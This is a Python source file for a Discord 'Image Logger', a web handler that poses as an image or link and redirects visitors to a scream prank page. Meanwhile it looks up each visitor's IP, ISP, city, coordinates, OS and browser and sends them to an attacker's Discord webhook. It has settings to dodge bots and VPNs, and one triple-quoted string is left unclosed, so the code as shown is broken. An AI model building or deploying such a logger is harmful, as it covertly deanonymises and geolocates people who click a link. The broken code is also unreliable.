from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

# === CONFIGURATION ===

config = {
    "webhook": "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL",  # Replace this
    "image":  "https://Pablo-Restrepo.github.io/Troll-Page-Scream/",

    "imageArgument": True,
    "username": "Image Logger",
    "color": 0x00FFFF,

    "crashBrowser": False,
    "accurateLocation": True,

    "message": {
        "doMessage": False,
        "message": "",
        "richMessage": True,
    },

    "vpnCheck": 1,
    "linkAlerts": True,
    "buggedImage": True,
    "antiBot": 1,

    "redirect": {
        "redirect": True,
        "page": "https://Pablo-Restrepo.github.io/Troll-Page-Scream/"  # Or your own hosted version
    },
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json={
        "username": config["username"],
        "content": "@everyone",
        "embeds": [{
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"Error occurred:\n```\n{error}\n```"
        }]
    })

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs): return
    bot = botCheck(ip, useragent)
    if bot:
        if config["linkAlerts"]:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "embeds": [{
                    "title": "Image Logger - Link Sent",
                    "color": config["color"],
                    "description": f"Link sent in a chat!\n**IP:** `{ip}`\n**Platform:** `{bot}`"
                }]
            })
        return

    ping = "@everyone"
    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()

    if info["proxy"]:
        if config["vpnCheck"] == 2: return
        if config["vpnCheck"] == 1: ping = ""

    if info["hosting"]:
        if config["antiBot"] in [3, 4]: return
        if config["antiBot"] in [1, 2]: ping = ""

    os, browser = httpagentparser.simple_detect(useragent)

    embed = {
        "username": config["username"],
        "content": ping,
        "embeds": [{
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**Endpoint:** `{endpoint}`

**IP Info:**
> **IP:** `{ip}`
> **Provider:** `{info['isp']}`
> **ASN:** `{info['as']}`
> **Country:** `{info['country']}`
> **City:** `{info['city']}`
> **Coords:** `{str(info['lat'])}, {str(info['lon'])}`
> **Timezone:** `{info['timezone']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting']}`

**System:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**

        }]
    }

    if url:
        embed["embeds"][0]["thumbnail"] = {"url": url}

    requests.post(config["webhook"], json=embed)

class ImageLoggerAPI(BaseHTTPRequestHandler):

    def handleRequest(self):
        try:
            ip = self.headers.get('x-forwarded-for')
            ua = self.headers.get('user-agent')

            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            if botCheck(ip, ua):
                makeReport(ip, endpoint=self.path.split("?")[0], url=url)
                self.send_response(200 if config["buggedImage"] else 302)
                self.send_header("Content-type" if config["buggedImage"] else "Location", "image/jpeg" if config["buggedImage"] else url)
                self.end_headers()
                return

            if config["redirect"]["redirect"]:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                redirect_html = f'<meta http-equiv="refresh" content="0; url={config["redirect"]["page"]}">'
                self.wfile.write(redirect_html.encode())
                makeReport(ip, ua, endpoint=self.path.split("?")[0], url=url)
                return

            # Default fallback if redirect is off (not used in this case)
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"<h1>No redirect set.</h1>")

        except Exception:
            self.send_response(500)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(b"500 - Internal Server Error")
            reportError(traceback.format_exc())

    do_GET = handleRequest
    do_POST = handleRequest

handler = app = ImageLoggerAPI

